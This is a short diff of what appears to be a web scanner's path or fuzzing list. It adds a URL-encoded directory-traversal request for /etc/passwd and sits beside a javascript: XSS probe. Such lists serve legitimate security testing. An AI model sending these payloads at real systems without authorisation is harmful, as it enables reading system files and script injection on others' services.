@@ -97,3 +97,4 @@
 /api/v1/orgs/{{orgname}}
 /healthz
 /workspace?url=javascript%3Aalert%28document.domain%29
+/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
